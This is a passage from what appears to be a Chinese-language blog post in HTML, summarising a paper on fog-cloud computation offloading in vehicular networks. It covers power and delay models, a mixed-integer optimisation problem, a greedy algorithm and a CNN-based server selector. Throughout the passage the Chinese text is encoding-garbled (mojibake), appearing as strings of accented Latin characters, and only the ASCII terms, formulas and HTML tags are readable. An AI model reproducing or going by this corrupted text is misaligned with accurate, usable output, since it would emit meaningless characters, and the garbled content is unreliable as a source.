æ­¤ï¼Œåšå‡ºæœ‰æ•ˆçš„å¸è½½å†³ç­–ä»¥åŒæ—¶æœ€å°åŒ–å…·æœ‰å»¶è¿Ÿçº¦æŸçš„è®¡ç®—è®¾æ–½å’Œè½¦è¾†çš„åŠŸè€—è‡³å…³é‡è¦ã€‚</p><p>è®ºæ–‡æå‡ºäº†ä¸€ç§è½¦è”ç½‘ï¼ˆIoVï¼‰ä¸­çš„é›¾äº‘è®¡ç®—å¸è½½ç®—æ³•ï¼Œä»¥æœ€å¤§é™åº¦åœ°å‡å°‘è½¦è¾†å’Œè®¡ç®—è®¾æ–½çš„åŠŸè€—ã€‚å…·ä½“æ¥è¯´ï¼Œ<strong>è´¡çŒ®</strong>æ€»ç»“å¦‚ä¸‹ï¼š</p><p><strong>1ï¼‰å»ºç«‹äº†é›¾äº‘å¸è½½ç³»ç»Ÿï¼Œç„¶ååˆ¶å®šäº†åŸºäºå»¶è¿Ÿçº¦æŸçš„æ•°å­¦æ¡†æ¶æ¥ä¼˜åŒ–åŠŸè€—ã€‚</strong></p><p><strong>2ï¼‰å°†æ•´ä¸ªç³»ç»Ÿåˆ†è§£ä¸ºå‰ç«¯å’Œåç«¯ä¸¤éƒ¨åˆ†ã€‚ä¹‹åï¼Œå¼€å‘äº†è½¦è½½ç½‘ç»œä¸­çš„ç»„åˆä¼ è¾“ç®—æ³•å’Œæ·±åº¦å­¦ä¹ æ¨¡å‹æ¥åˆ†åˆ«è§£å†³å‰ç«¯å’Œåç«¯çš„ä¼˜åŒ–é—®é¢˜ã€‚</strong></p><p><strong>3ï¼‰è¿›è¡Œæ¨¡æ‹Ÿæ¥éªŒè¯æˆ‘ä»¬çš„é›¾äº‘è®¡ç®—å¸è½½ç®—æ³•çš„æœ‰æ•ˆæ€§ã€‚</strong></p><p>ä»¿çœŸç»“æœè¡¨æ˜ï¼Œå®ƒå¯ä»¥åœ¨æ»¡è¶³å»¶è¿Ÿè¦æ±‚çš„åŒæ—¶æ˜¾ç€ä¼˜åŒ–åŠŸè€—ã€‚</p><h3 id="2-ç›¸å…³å·¥ä½œ">2.ç›¸å…³å·¥ä½œ</h3><p>å‡­å€Ÿä¸°å¯Œçš„è®¡ç®—èµ„æºï¼Œäº‘è®¡ç®—åœ¨è½¦è”ç½‘ç³»ç»Ÿä¸­å¼•èµ·äº†æå¤§çš„å…³æ³¨[9]ã€‚ [10] ä¸­çš„ä½œè€…æå‡ºäº†ä¸€ç§æœ‰å‰é€”çš„ç½‘ç»œèŒƒå¼ï¼Œåœ¨äº‘ä¸Šè¿›è¡Œé¢„æµ‹å¸è½½ï¼Œä»¥æœ€å¤§é™åº¦åœ°å‡å°‘è½¦è”ç½‘ç³»ç»Ÿä¸­çš„å»¶è¿Ÿå’ŒåŠŸè€—ã€‚</p><p>ç„¶è€Œï¼Œ<strong>äº‘è®¡ç®—å­˜åœ¨ä»¥ä¸‹ç¼ºé™·</strong>ï¼š</p><p><strong>é¦–å…ˆï¼Œäº‘æœåŠ¡å™¨è·ç¦»è½¦è¾†è¾ƒè¿œï¼Œéš¾ä»¥æ»¡è¶³å»¶è¿Ÿæ•æ„Ÿåº”ç”¨çš„éœ€æ±‚ã€‚</strong></p><p><strong>å…¶æ¬¡ï¼Œæ•°æ®ä¸­å¿ƒçš„ç”µåŠ›æ¶ˆè€—æˆæœ¬ç›¸å½“æ˜‚è´µã€‚</strong></p><p><strong>æœ€åï¼Œäº‘è®¡ç®—å¯¹è½¦è½½åº”ç”¨çš„æ”¯æŒæ€§èƒ½è¾ƒå·®</strong>ã€‚</p><p>ä¸ç§»åŠ¨äº‘ã€å°äº‘å’Œè¾¹ç¼˜è®¡ç®—ç±»ä¼¼ï¼Œé›¾è®¡ç®—é€šè¿‡å°†äº‘è®¡ç®—æ‰©å±•åˆ°ç½‘ç»œè¾¹ç¼˜è€Œæˆä¸ºä¸€ç§æœ‰å‰é€”çš„èŒƒä¾‹ã€‚</p><p>ä¸ºæ»¡è¶³å¤šç”¨æˆ·è®¡ç®—å¸è½½éœ€æ±‚ï¼Œæå‡ºäº†ç§»åŠ¨äº‘å¸è½½æ¨¡å‹ï¼Œä»è€Œå¼¥è¡¥äº†ç§»åŠ¨äº‘çš„ä¸è¶³ã€‚</p><p>è¾¹ç¼˜è®¡ç®—é€šè¿‡å……åˆ†åˆ©ç”¨è½¦è¾†çš„é—²ç½®èµ„æºï¼ˆä¾‹å¦‚ç§»åŠ¨ä¸­æˆ–åœè½¦ä½ä¸­çš„è½¦è¾†ï¼‰æ¥å®ç°å®æ—¶äº¤é€šç®¡ç†ã€‚</p><p>ç„¶è€Œï¼Œä¸äº‘æˆ–å°äº‘è®¡ç®—ç›¸æ¯”ï¼Œè½¦è¾†è¾¹ç¼˜è®¡ç®—çš„è®¡ç®—å’Œå­˜å‚¨èƒ½åŠ›ä»ç„¶æœ‰é™ã€‚</p><p>æ­¤å¤–ï¼Œé›¾èŠ‚ç‚¹æ™®éç¼ºä¹é€šè¿‡è‡ªå­¦ä¹ å˜å¾—æ™ºèƒ½åŒ–çš„èµ„æºã€‚</p><p>æ­¤å¤–ï¼Œå¯¹è½¦è¾†ç§»åŠ¨æ€§çš„å‡†ç¡®é¢„æµ‹å¾ˆå¤§ç¨‹åº¦ä¸Šå½±å“äº†å…¶è®¡ç®—èµ„æºå’Œèƒ½æºçš„åˆ©ç”¨</p><p>ä¸€ç§æ–¹æ³•æ˜¯æ ¹æ®è½¦è¾†çš„ä½ç½®ã€æ–¹å‘å’Œé€Ÿåº¦æ¥æŒ–æ˜äº¤é€šæµã€‚</p><p>éšç€ç”µåŠ¨æ±½è½¦çš„æ™®åŠï¼Œäººä»¬å¼€å§‹ç ”ç©¶è½¦è¾†åˆ°ç”µç½‘æŠ€æœ¯æ¥ä¸ºç”µåŠ¨æ±½è½¦å……ç”µå¹¶åœ¨æ™ºèƒ½ç”µç½‘ä¸­ç›‘æ§å…¶ç”µåŠ›çŠ¶æ€ã€‚ [19]ä¸­è®¾è®¡äº†è½¦è¾†åˆ°ç”µç½‘ç½‘ç»œçš„æ··åˆè®¡ç®—æ¨¡å‹ï¼ŒåŒ…æ‹¬æ°¸ä¹…äº‘æˆ–å°äº‘å’Œä¸´æ—¶è½¦è¾†é›¾èŠ‚ç‚¹ã€‚ä¸ºäº†é€šè¿‡VFCæä¾›å®‰å…¨çš„é€šä¿¡å’ŒæœåŠ¡ï¼Œæ™ºèƒ½å¯¹äºè½¦è”ç½‘ä¸­çš„ç½‘ç»œæ§åˆ¶å’Œç®¡ç†æ˜¯å¿…ä¸å¯å°‘çš„[20]ã€‚åœ¨[21]ä¸­ï¼Œä½œè€…è®¾è®¡äº†ä¸€ç§ç”±é›¾è®¡ç®—æ”¯æŒçš„åˆ†å±‚æ¶æ„ï¼Œä¸ºé‚»é‡Œã€ç¤¾åŒºå’Œå…¨å¸‚äº¤é€šç®¡ç†æä¾›åŠæ—¶å“åº”ã€‚</p><p>ä¸ç°æœ‰ç ”ç©¶ä¸åŒï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯æœ€å°åŒ–è½¦è¾†å’Œè®¡ç®—è®¾æ–½çš„åŠŸè€—ã€‚åœ¨å‰ç«¯ï¼ˆè½¦è¾†ä¾§ï¼‰ï¼Œæˆ‘ä»¬è®¾è®¡äº†ç»„åˆä¼ è¾“ç®—æ³•æ¥èŠ‚çœèƒ½æºã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬å¼€å‘äº†ä¸€ç§æ·±åº¦å­¦ä¹ æ–¹æ³•æ¥ä¼˜åŒ–å·¥ä½œè´Ÿè½½ï¼Œä»¥æœ€å¤§é™åº¦åœ°å‡å°‘åç«¯ï¼ˆé›¾å’Œäº‘è®¾æ–½ï¼‰çš„åŠŸè€—ã€‚<strong>æ®æˆ‘ä»¬æ‰€çŸ¥ï¼Œè¿™æ˜¯ç¬¬ä¸€ä¸ªé’ˆå¯¹å¦‚ä½•é€šè¿‡æ·±åº¦å­¦ä¹ æ–¹æ³•åœ¨è½¦è”ç½‘ç³»ç»Ÿå¸è½½æ¨¡å‹ä¸­æœ€å°åŒ–åŠŸè€—æä¾›è¯¦ç»†è®¾è®¡çš„å·¥ä½œã€‚</strong></p><h3 id="3-ç³»ç»Ÿæ¨¡å‹å’Œé—®é¢˜è¡¨è¿°">3.ç³»ç»Ÿæ¨¡å‹å’Œé—®é¢˜è¡¨è¿°</h3><p>å¦‚å›¾æ‰€ç¤ºï¼Œç³»ç»Ÿæ¶æ„åŒ…æ‹¬ï¼šä¸€ç»„è·¯ä¾§å•å…ƒa set of Roadside Unitsï¼ˆRSUï¼‰ã€é›¾è®¾å¤‡å’Œäº‘æœåŠ¡å™¨ã€‚ RSU æ¥æ”¶æ¥è‡ªè½¦è¾†çš„è¯·æ±‚å¹¶å°†å…¶å‘é€åˆ°é›¾è®¾å¤‡ã€‚åœ¨æ¨¡å‹ä¸­ï¼Œæˆ‘ä»¬å‡è®¾ RSU å¯ä»¥è¦†ç›–å®éªŒåŒºåŸŸå†…çš„æ‰€æœ‰è½¦è¾†ã€‚è½¦è¾†è¿˜å¯ä»¥åŸºäºèœ‚çªåŸºç«™ç­‰å…¶ä»–è®¾æ–½æ¥å…¥ç½‘ç»œï¼Œæœ¬æ–‡ä¸äºˆè®¨è®ºã€‚é›¾èŠ‚ç‚¹å¯ä»¥å¤„ç†è¯·æ±‚å¹¶é€šè¿‡å¹¿åŸŸç½‘ï¼ˆWANï¼‰å°†å†—ä½™è¯·æ±‚è½¬å‘åˆ°äº‘æœåŠ¡å™¨ã€‚æ¯ä¸ªäº‘æœåŠ¡å™¨æ‰˜ç®¡è®¸å¤šè™šæ‹Ÿæœºã€‚ç”±äºå¹¿åŸŸç½‘è¦†ç›–äº†ä»é›¾èŠ‚ç‚¹åˆ°äº‘æœåŠ¡å™¨çš„è¾ƒå¤§åœ°ç†åŒºåŸŸï¼Œå› æ­¤ç›¸åº”çš„ä¼ è¾“å»¶è¿Ÿä¸å¯å¿½è§†ï¼ˆä¸å±€åŸŸç½‘ç›¸æ¯”ï¼‰ã€‚æ­¤å¤–ï¼Œè¿˜åº”è¯¥è€ƒè™‘é›¾èŠ‚ç‚¹æˆ–äº‘æœåŠ¡å™¨çš„è®¡ç®—å»¶è¿Ÿã€‚æ­¤å¤–ï¼Œä»è½¦è¾†åˆ°RSUçš„å‰ç«¯çš„åŠŸè€—å’Œå»¶è¿Ÿæ˜¯ç³»ç»Ÿæ€§èƒ½çš„é‡è¦å› ç´ ã€‚å› æ­¤ï¼Œæˆ‘ä»¬<strong>ä¸»è¦è€ƒè™‘äº‘å±‚ã€é›¾å±‚ã€å¹¿åŸŸç½‘è°ƒåº¦ä»¥åŠè½¦è¾†åˆ°è·¯ä¾§å•å…ƒçš„ä¼ è¾“è¿‡ç¨‹å››ä¸ªéƒ¨åˆ†çš„åŠŸè€—å’Œå»¶è¿Ÿã€‚</strong></p><p><img src="/2024/01/21/%E8%AF%BB%E8%AE%BA%E6%96%87/image-20240120184917955.png" alt="å›¾1.é›¾-äº‘è®¡ç®—ç³»ç»Ÿæ¶æ„"></p><h4 id="3-1-ç³»ç»Ÿæ¨¡å‹">3.1 ç³»ç»Ÿæ¨¡å‹</h4><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯åœ¨ä¿è¯è½¦è¾†å’Œè½¦è”ç½‘ç³»ç»Ÿè®¡ç®—åŸºç¡€è®¾æ–½å»¶è¿Ÿçš„æƒ…å†µä¸‹æœ€å¤§é™åº¦åœ°é™ä½åŠŸè€—ã€‚</p><h5 id="1ï¼‰é›¾è®¾å¤‡çš„åŠŸè€—ï¼š">1ï¼‰é›¾è®¾å¤‡çš„åŠŸè€—ï¼š</h5><p>è®ºæ–‡é‡Œçš„æ„æ€å°±æ˜¯ä¸€ä¸ªçº¿æ€§å…³ç³»å¼</p><p>é›¾è®¾å¤‡çš„åŠŸè€—=A*é›¾è®¾å¤‡çš„é¢‘ç‡+B</p><p>Aï¼ŒBæ˜¯ä¸¤ä¸ªæ­£å¸¸æ•°ï¼Œä¸”é¢„å…ˆç¡®å®šçš„</p><h5 id="2ï¼‰é›¾è®¾å¤‡çš„é€šä¿¡å»¶è¿Ÿï¼š">2ï¼‰é›¾è®¾å¤‡çš„é€šä¿¡å»¶è¿Ÿï¼š</h5><p>å‡è®¾å®ƒæ˜¯é›¾è®¾å¤‡å¤„ç†è¯·æ±‚çš„æ’é˜Ÿç³»ç»Ÿã€‚å¯¹äºè®¾å¤‡ï¼Œå…¶è®¡ç®—å»¶è¿ŸåŒ…æ‹¬ç­‰å¾…æ—¶é—´å’ŒæœåŠ¡æ—¶é—´ï¼Œ</p><p>è®¡ç®—å»¶è¿Ÿ=1/ï¼ˆæœåŠ¡ç‡-ä»»åŠ¡åˆ°è¾¾ç‡ï¼‰</p><h5 id="3ï¼‰äº‘æœåŠ¡å™¨çš„åŠŸè€—ï¼š">3ï¼‰äº‘æœåŠ¡å™¨çš„åŠŸè€—ï¼š</h5><p>å¦‚å‰æ‰€è¿°ï¼Œæ¯å°äº‘æœåŠ¡å™¨æ‰¿è½½ç€å¤§é‡çš„è®¡ç®—æœºã€‚æˆ‘ä»¬ç®€å•åœ°å‡è®¾äº‘æœåŠ¡å™¨ä¸­è¿™äº›æœºå™¨çš„ CPU é¢‘ç‡æ˜¯ç›¸ç­‰çš„ã€‚é€šè¿‡CPUé¢‘ç‡fçš„å‡½æ•°æ¥è¿‘ä¼¼æœåŠ¡å™¨jä¸­æ¯å°æœºå™¨çš„åŠŸè€—å€¼</p><p>äº‘æœåŠ¡å™¨çš„åŠŸè€—j=n*ï¼ˆA *äº‘æœåŠ¡å™¨ä¸­çš„æŸä¸€ä¸ªæœºå™¨+Bï¼‰</p><p>Aï¼ŒBæ˜¯ä¸¤ä¸ªæ­£å¸¸æ•°</p><h5 id="4ï¼‰äº‘æœåŠ¡å™¨é€šä¿¡å»¶è¿Ÿï¼š">4ï¼‰äº‘æœåŠ¡å™¨é€šä¿¡å»¶è¿Ÿï¼š</h5><p>äº‘æœåŠ¡å™¨çš„å»¶è¿Ÿåˆå¯ä»¥åˆ†ä¸ºç­‰å¾…å»¶è¿Ÿå’Œå¤„ç†å»¶è¿Ÿã€‚</p><p>æˆ‘ä»¬å°†ç³»ç»Ÿå»ºæ¨¡ä¸ºæ’é˜Ÿç½‘ç»œï¼Œæ‰€ä»¥å¯ä»¥å»ºæ¨¡ä¸º M/M/né˜Ÿåˆ—ã€‚</p><p>å› æ­¤ï¼Œäº‘æœåŠ¡å™¨çš„æ€»è®¡ç®—å»¶è¿Ÿç”±ä¸‹å¼ç»™å‡ºï¼š</p><p>å…¬å¼æœ‰ç‚¹å°å¤æ‚ï¼Œå…ˆç•¥è¿‡</p><h5 id="5ï¼‰é€šä¿¡ä¼ è¾“å»¶è¿Ÿï¼š">5ï¼‰é€šä¿¡ä¼ è¾“å»¶è¿Ÿï¼š</h5><p>å®ƒå¯ä»¥åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šè°ƒåº¦çš„é€šä¿¡å»¶è¿Ÿå’Œè½¦è¾†ä¸è·¯ä¾§å•å…ƒä¹‹é—´çš„é€šä¿¡å»¶è¿Ÿã€‚</p><p>å¯¹äºè°ƒåº¦çš„é€šä¿¡å»¶è¿Ÿï¼Œæˆ‘ä»¬ä½¿ç”¨wijè®°å½•é›¾è®¾å¤‡iåˆ°äº‘æœåŠ¡å™¨jçš„å¸¦å®½ã€‚è°ƒåº¦çš„é€šä¿¡å»¶è¿Ÿè®¡ç®—å¦‚ä¸‹ï¼š</p><p>è°ƒåº¦çš„é€šä¿¡å»¶è¿Ÿ=æ•°æ®å¤§å°/(Wij*(log2(1+n0)))</p><p>ä½¿ç”¨wijè®°å½•é›¾è®¾å¤‡iåˆ°äº‘æœåŠ¡å™¨jçš„å¸¦å®½ï¼Œå…¶ä¸­ n0=S/N å°±æ˜¯ä¿¡å™ªæ¯”ã€‚</p><p>è¿™ä¸ªå°±æ˜¯é¦™å†œé‚£ä¸ªå®šç†</p><p>å¯¹äºè½¦è¾†å’ŒRSUçš„é€šä¿¡å»¶è¿Ÿï¼Œæˆ‘ä»¬è€ƒè™‘å¤šè·³V2Iå’ŒV2Væ¨¡å¼ã€‚å¯¹äºV2Iæ¨¡å¼ï¼Œç›¸åº”çš„å»¶è¿ŸåŒ…å«ä¸¤éƒ¨åˆ†ï¼Œå³ä¸Šä¼ æ—¶é—´å’Œä»æºåˆ°ç›®æ ‡RSUçš„3ä¸ªä¼ è¾“æ—¶é—´ã€‚å¯¹äºV2Væ¨¡å¼ï¼Œä¼ è¾“å»¶è¿Ÿæ¯”V2Iæ¨¡å‹ä¸­çš„å»¶è¿Ÿè¦å¤§ï¼Œå¹¶ä¸”æ˜¯ä¸Šä¼ æ—¶é—´å’Œå¤šè·³è½¦è¾†ä¹‹é—´çš„V2Vä¸­ç»§å»¶è¿Ÿçš„æ€»å’Œã€‚ [10]ä¸­æå‡ºäº†ä¸€ç§å®ç”¨çš„é¢„æµ‹æ–¹æ¡ˆæ¥é¢„æµ‹å¤šè·³ä¼ è¾“ä¸­çš„å»¶è¿Ÿã€‚å› æ­¤ï¼Œè½¦è¾†å’Œ RSU ä¹‹é—´çš„å»¶è¿Ÿ å¯ä»¥é€šè¿‡ V2I å’Œ V2V æ¨¡å¼ä¸‹çš„å»¶è¿Ÿç»„åˆæ¥è·å¾—ã€‚</p><h5 id="6ï¼‰ä¼ è¾“åŠŸè€—ï¼š">6ï¼‰ä¼ è¾“åŠŸè€—ï¼š</h5><p>ç‰©ç†åŸºç¡€è®¾æ–½ä¸»è¦åŒ…æ‹¬å‰ç«¯çš„RSUå’Œè½¦è¾†ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¸Šä¼ è¯·æ±‚åŒ…çš„å¤§å°è¿œå¤§äºè¯·æ±‚ç»“æœè¿”å›åŒ…çš„å¤§å°ã€‚å› æ­¤ï¼Œæˆ‘ä»¬ä¸»è¦å…³å¿ƒä¸Šä¼ é“¾è·¯çš„åŠŸè€—å’Œå»¶è¿Ÿï¼Œè€Œå¿½ç•¥è¿”å›é“¾è·¯ã€‚ä»¤ R å’Œ U åˆ†åˆ«ä¸º RSU å’Œè½¦è¾†çš„é›†åˆï¼Œå…¶ä¸­ R = {1,â€¦, R} å’Œ U = {1,â€¦, U}ã€‚ä»è½¦è¾†åˆ° RSU æœ‰ä¸¤ç§ä¼ è¾“æ¨¡å¼ã€‚ç¬¬ä¸€ç§æ˜¯ç›´æ¥V2Iæ¨¡å¼ï¼Œå¦ä¸€ç§æ˜¯V2Vé¢„æµ‹ä¼ è¾“æ¨¡å¼ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ·»åŠ ä»æºåˆ°ç›®çš„åœ°çš„ RSU ä¹‹é—´çš„æµé‡ä¸Šä¼ å’Œä¸­ç»§æ¥è®¡ç®— V2I æ¨¡å¼ä¸‹ä»è½¦è¾† u åˆ° RSU r çš„ä»»åŠ¡çš„åŠŸè€—ã€‚</p><p>å¯¹äºV2Væ¨¡å¼ï¼Œæ¶ˆè€—çš„èƒ½é‡æ¯”V2Iæ¨¡å¼ä½ï¼Œå¹¶ä¸”æ˜¯å¤šè·³è½¦è¾†ä¹‹é—´çš„æµé‡ä¸Šä¼ å’Œä¸­ç»§çš„æ€»å’Œã€‚å› æ­¤ï¼Œè€ƒè™‘åˆ°ç›¸åº”çš„ä¼ è¾“å»¶è¿Ÿå’Œæˆæœ¬ï¼Œè½¦è¾†å’ŒRSUä¹‹é—´çš„åŠŸè€—æ˜¯V2Iå’ŒV2Væ¨¡å¼ä¸‹å»¶è¿Ÿçš„ç»„åˆã€‚</p><h4 id="3-2-é—®é¢˜è¡¨è¿°">3.2 é—®é¢˜è¡¨è¿°</h4><p>æˆ‘ä»¬çš„é›¾äº‘é›†æˆæ¡†æ¶çš„ç›®æ ‡æ˜¯åœ¨æ»¡è¶³ç½‘ç»œå»¶è¿Ÿçº¦æŸçš„åŒæ—¶æœ€å¤§é™åº¦åœ°å‡å°‘åŠŸè€—ã€‚å¦‚ä¸Šåˆ†æï¼Œ</p><p>ç½‘ç»œæ€»æ—¶å»¶=é›¾è®¾å¤‡içš„æ—¶å»¶+äº‘è®¾å¤‡jçš„æ—¶å»¶+ä»iåˆ°jçš„ä¼ è¾“æ—¶å»¶+è½¦è¾†å’ŒRSUä¹‹é—´çš„å»¶è¿Ÿ</p><p>ç³»ç»Ÿèƒ½è€—ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œé›¾èŠ‚ç‚¹ã€äº‘æœåŠ¡å™¨ä»¥åŠè½¦è¾†å’ŒRSUä¹‹é—´çš„æ€»åŠŸè€—</p><p>ä¼˜åŒ–é—®é¢˜æ˜¯æœ€å°åŒ–é›¾èŠ‚ç‚¹ã€äº‘æœåŠ¡å™¨ä»¥åŠè½¦è¾†å’ŒRSUä¹‹é—´çš„æ€»åŠŸè€—ã€‚åº”æ»¡è¶³ä»¥ä¸‹çº¦æŸï¼š</p><p><strong>1) æ€»çš„ç½‘ç»œå»¶è¿Ÿå°äºå»¶è¿Ÿé˜ˆå€¼ï¼›</strong></p><p><strong>2ï¼‰é›¾èŠ‚ç‚¹çš„å¤„ç†èƒ½åŠ›æ˜¯æœ‰é™çš„ï¼Œå³å…¶åˆ°è¾¾ç‡å’Œæ‰€éœ€çš„CPUå‘¨æœŸä¸èƒ½è¶…è¿‡å…¶å¤„ç†èƒ½åŠ›çš„ä¸Šé™ï¼›</strong></p><p><strong>3ï¼‰åŒæ ·ï¼Œå¯¹äºäº‘æœåŠ¡å™¨ï¼Œä¸€å°äº‘æœåŠ¡å™¨çš„åˆ°è¾¾ç‡å’Œäº‘æœåŠ¡å™¨åˆ†é…çš„è¯·æ±‚æ‰€éœ€çš„CPUå‘¨æœŸåº”è¯¥åœ¨äº‘æœåŠ¡å™¨çš„æœ€å¤§åˆ°è¾¾ç‡å’Œæ‰€éœ€çš„CPUå‘¨æœŸçš„èŒƒå›´å†…ã€‚</strong></p><p><strong>4ï¼‰ä¸€å°äº‘æœåŠ¡å™¨å†…çš„æœºå™¨æ•°é‡ä¸ºæ•´æ•°ï¼Œäº‘æœåŠ¡å™¨çš„è¿è¡ŒçŠ¶æ€ä¸ºäºŒè¿›åˆ¶ã€‚</strong></p><p><strong>5ï¼‰äº‘èŠ‚ç‚¹å’Œäº‘æœåŠ¡å™¨å¤„ç†çš„ç½‘ç»œæµé‡ä¸å°‘äºè¦å¤„ç†çš„æ€»ç½‘ç»œæµé‡ã€‚</strong></p><p>ä¸Šè¿°é—®é¢˜æ˜¯ä¸€ä¸ªæ··åˆæ•´æ•°éçº¿æ€§è§„åˆ’ï¼ˆMINLPï¼‰é—®é¢˜ï¼Œå·²è¢«è¯æ˜æ˜¯NPå›°éš¾çš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§å¯å‘å¼ç®—æ³•ï¼Œç”¨äºåŸºäºé›¾çš„è½¦è”ç½‘ç³»ç»Ÿä¸­çš„å¸è½½ï¼Œä»¥å¯æ¥å—çš„è®¡ç®—å¤æ‚åº¦æœ‰æ•ˆåœ°è§£å†³æ‰€æå‡ºçš„é—®é¢˜ã€‚</p><h3 id="4-åŸºäºæ·±åº¦å­¦ä¹ çš„èƒ½æºé«˜æ•ˆå¸è½½æ–¹æ¡ˆ">4.åŸºäºæ·±åº¦å­¦ä¹ çš„èƒ½æºé«˜æ•ˆå¸è½½æ–¹æ¡ˆ</h3><p>æˆ‘ä»¬å°†æ•´ä¸ªç³»ç»Ÿåˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šå‰ç«¯å’Œåç«¯ã€‚</p><p>å‰ç«¯ç”±è½¦è¾†å’Œ RSU ç»„æˆã€‚å…¶æˆæœ¬ä¸»è¦æ˜¯è½¦è¾†å’ŒRSUä¹‹é—´é€šä¿¡çš„æ¶ˆè€—å’Œå»¶è¿Ÿï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯æœ€å°åŒ–Dur transå’ŒPur transã€‚æˆ‘ä»¬é‡‡ç”¨é¢„æµ‹ç»„åˆä¼ è¾“æ–¹å¼æ¥è§£å†³ä¸Šè¿°é—®é¢˜ã€‚</p><p>åç«¯åŒ…å«é›¾èŠ‚ç‚¹å’Œäº‘æœåŠ¡å™¨ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§æ·±åº¦å­¦ä¹ æ¨¡å‹ä»¥æœ€å°åŒ–å…¶æˆæœ¬</p><h4 id="4-1-è´ªå¿ƒç®—æ³•">4.1 è´ªå¿ƒç®—æ³•</h4><p>åœ¨è´ªå¿ƒç®—æ³•ä¸­ï¼Œè¯·æ±‚è¢«æ’é˜Ÿå¹¶ä¾æ¬¡å¤„ç†ã€‚åœ¨æ¯ä¸ªæ­¥éª¤ä¸­ï¼Œé€‰æ‹©åœ¨çº¦æŸä¸‹å…·æœ‰æœ€å°åŠŸè€—çš„æœåŠ¡å™¨æ¥å¤„ç†æ’é˜Ÿè¯·æ±‚ã€‚å¯¹äºæ¯ä¸ªè¯·æ±‚ï¼Œæˆ‘ä»¬å°†å…¶æ”¾ç½®åˆ°å½“å‰çš„æœ€ä½³ä½ç½®ã€‚æœ€ç»ˆï¼Œæˆ‘ä»¬å¾—åˆ°è¿™äº›è¯·æ±‚çš„æ€»åŠŸç‡æ¶ˆè€—å’Œå»¶è¿Ÿã€‚</p><h4 id="4-2-æ·±åº¦å­¦ä¹ æ¨¡å‹">4.2 æ·±åº¦å­¦ä¹ æ¨¡å‹</h4><h5 id="1ï¼‰è¾“å…¥å’Œè¾“å‡ºè®¾è®¡ï¼š">1ï¼‰è¾“å…¥å’Œè¾“å‡ºè®¾è®¡ï¼š</h5><p>æˆ‘ä»¬è€ƒè™‘çš„ç³»ç»Ÿæ¨¡å‹å¦‚å›¾1æ‰€ç¤ºã€‚æˆ‘ä»¬æ€»å…±æœ‰nä¸ªå¯é€‰çš„é›¾èŠ‚ç‚¹å’Œäº‘æœåŠ¡å™¨æ¥å¤„ç†æ¥è‡ªå‰ç«¯çš„è¯·æ±‚ã€‚å› æ­¤ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½ä¿å­˜äº†æœ€è¿‘Hä¸ªå‘¨æœŸå†…çš„è¯·æ±‚æ•°é‡å’Œå¹³å‡åŠŸè€—çš„è®°å½•ã€‚ Hçš„å€¼ç”±CPUé¢‘ç‡å’Œæ¯ä¸ªä»»åŠ¡å¹³å‡æ‰€éœ€çš„CPUå‘¨æœŸå†³å®šï¼Œæˆ‘ä»¬é€‰æ‹©CNNæ¨¡å‹ä¸­æŸå¤±æœ€å°çš„Hå€¼ã€‚æˆ‘ä»¬é‡‡ç”¨è¿™äº›è®°å½•ä½œä¸ºæ·±åº¦å­¦ä¹ æ¨¡å‹çš„è¾“å…¥ã€‚</p><p>ä¸[27]ç±»ä¼¼ï¼Œæˆ‘ä»¬ä¹Ÿè€ƒè™‘å·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰ç»“æ„ã€‚ä¸ºäº†è®­ç»ƒæˆ‘ä»¬çš„ CNN æ¨¡å‹ï¼Œéœ€è¦æ ‡è®°æ•°æ®ï¼ˆå³ (xï¼Œyï¼‰ ç»„ï¼‰æ¥æ‰§è¡Œç›‘ç£è®­ç»ƒ</p><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯é€šè¿‡æ„å»ºåŸºäº CNN çš„ç³»ç»Ÿæ¥è¯†åˆ«ç½‘ç»œæµé‡çš„ç‰¹å¾ã€‚å¦‚å›¾2(a)æ‰€ç¤ºï¼Œè¾“å…¥æ•°æ®çš„ä½çº§ç‰¹å¾åœ¨ç‰¹å¾æå–éƒ¨åˆ†è¢«è¿‡æ»¤ã€‚æ± åŒ–å±‚çš„ç›®çš„æ˜¯å‡å°‘ç‰¹å¾å’Œå‚æ•°çš„å¤§å°ï¼Œå¹¶åŠ å¿«ç½‘ç»œè®¡ç®—é€Ÿåº¦ã€‚é€šè¿‡ä»å·ç§¯å±‚å’Œæ± åŒ–å±‚æå–çš„ç‰¹å¾ï¼Œè¾“å‡ºåˆ†ç±»çš„æ•ˆæœå¯ä»¥é€šè¿‡å…¨è¿æ¥å±‚æ¥è®¡ç®—ã€‚åœ¨å›¾2(b)ä¸­ï¼ŒæœåŠ¡å™¨ä»¥å¤šä¸ªé—´éš”è®°å½•çš„ä¿¡æ¯æ˜¯è¾“å…¥æ•°æ®ã€‚</p><p><img src="/2024/01/21/%E8%AF%BB%E8%AE%BA%E6%96%87/image-20240121201242818.png" alt="å›¾2åŸºäºCNNçš„æ·±åº¦å­¦ä¹ æ¨¡å‹"></p><p>å®ƒèƒ½è¢«è¡¨ç¤ºç”±ä¸‰ç»´çŸ©é˜µï¼Œå³é€šé“ã€ç½‘ç»œç‰¹å¾å’ŒæœåŠ¡èŠ‚ç‚¹ã€‚åˆ©ç”¨æ·±åº¦å­¦ä¹ ç»“æ„æ¥è®¡ç®—å€™é€‰æœåŠ¡å™¨ã€‚å› æ­¤ï¼Œæˆ‘ä»¬é€‰æ‹©æœåŠ¡å™¨ç¼–å·ä½œä¸ºæ·±åº¦å­¦ä¹ æ¨¡å‹çš„è¾“å‡ºã€‚å› æ­¤ï¼Œè¾“å‡ºå€¼çš„èŒƒå›´ä¸º[0, N-1]ï¼Œè¡¨ç¤ºæœåŠ¡å™¨ç¼–å·ã€‚</p><h5 